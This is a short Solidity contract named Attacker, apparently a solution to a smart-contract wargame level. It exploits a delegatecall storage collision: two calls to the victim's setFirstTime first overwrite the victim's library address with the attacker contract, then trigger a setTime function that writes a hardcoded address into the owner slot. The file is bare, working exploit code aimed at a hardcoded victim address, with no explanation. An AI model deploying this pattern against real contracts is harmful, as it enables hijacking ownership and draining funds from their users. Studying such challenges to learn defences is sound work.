// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker{
    address victim = 0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8;
    address public timeZone2Library;
    address public owner;
    bool status;

    function Attack() external returns (bool) {
        (status, ) = victim.call(abi.encodeWithSignature("setFirstTime(uint256)", uint256(uint160(address(this)))));
        (status, ) = victim.call(abi.encodeWithSignature("setFirstTime(uint256)", 1));
        return status;
    }

    function setTime(uint _time) public {
        owner = 0x9156b5Bf1789F6d977296ce02A10eaE5330Bb5eF;
    }
}